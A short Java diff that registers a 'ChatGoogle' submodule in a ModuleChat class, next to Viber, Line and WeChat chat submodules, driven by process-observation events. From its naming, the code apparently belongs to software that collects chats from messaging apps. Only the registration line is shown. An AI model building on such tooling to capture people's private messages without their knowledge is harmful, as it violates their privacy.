@@ -76,6 +76,7 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 			subModuleManager.add(new ChatViber());
 			subModuleManager.add(new ChatLine());
 			subModuleManager.add(new ChatWeChat());
+			subModuleManager.add(new ChatGoogle());
 			
 		}
 	}
